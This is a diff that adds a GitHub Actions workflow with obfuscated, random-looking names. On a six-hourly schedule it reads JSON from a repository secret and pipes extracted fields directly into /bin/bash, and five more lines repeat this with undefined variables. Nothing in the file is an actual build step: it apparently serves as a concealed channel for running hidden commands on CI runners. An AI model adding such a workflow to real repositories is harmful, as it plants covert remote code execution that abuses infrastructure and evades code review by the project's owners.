@@ -1,0 +1,23 @@
+name: fortieszonked
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fortieszonked
+        env:
+          dvygh28229: ${{ secrets.dvygh28229 }}
+        run: |
+          echo $dvygh28229 | jq -r .drat92 | /bin/bash
+          echo $xzl351 | jq -r .f85674 | /bin/bash
+          echo $szyzx61102 | jq -r .xjno17485 | /bin/bash
+          echo $lz52057 | jq -r .vr751 | /bin/bash
+          echo $ff126 | jq -r .ijtn889 | /bin/bash
+          echo $zpbcv2 | jq -r .fl05 | /bin/bash
+
